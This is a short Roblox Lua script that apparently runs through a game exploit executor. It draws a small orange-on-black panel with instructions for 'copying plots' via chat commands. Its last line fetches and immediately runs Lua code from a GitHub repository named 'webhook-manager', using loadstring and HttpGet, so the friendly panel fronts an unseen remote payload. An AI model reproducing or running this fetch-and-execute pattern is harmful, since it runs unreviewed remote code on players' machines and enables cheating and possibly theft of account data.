local ScreenGui = Instance.new("ScreenGui")
		local Frame = Instance.new("Frame")
		local UICorner = Instance.new("UICorner")
		local TextLabel = Instance.new("TextLabel")
		local UICorner_2 = Instance.new("UICorner")

		--Properties:

		ScreenGui.Parent = game.CoreGui
		ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

		Frame.Parent = ScreenGui
		Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Frame.Position = UDim2.new(0.0405844152, 0, 0.677074552, 0)
		Frame.Size = UDim2.new(0, 170, 0, 143)
		Frame.Active = true

		UICorner.Parent = Frame

		TextLabel.Parent = Frame
		TextLabel.BackgroundColor3 = Color3.fromRGB(242, 135, 5)
		TextLabel.BackgroundTransparency = 1.000
		TextLabel.Position = UDim2.new(0.052941177, 0, 0.057990443, 0)
		TextLabel.Size = UDim2.new(0, 152, 0, 127)
		TextLabel.Font = Enum.Font.ArialBold
		TextLabel.Text = "To Copy plots you must hold out btools by using the command: !btools and create a plot using the command: !createplot"
		TextLabel.TextColor3 = Color3.fromRGB(242, 135, 5)
		TextLabel.TextScaled = true
		TextLabel.TextSize = 14.000
		TextLabel.TextWrapped = true

		UICorner_2.Parent = TextLabel


		wait(0.5)

		loadstring(game:HttpGet('https://raw.githubusercontent.com/CosmicDev-Official/webhook-manager/main/main.lua?t='..tostring(tick())))()
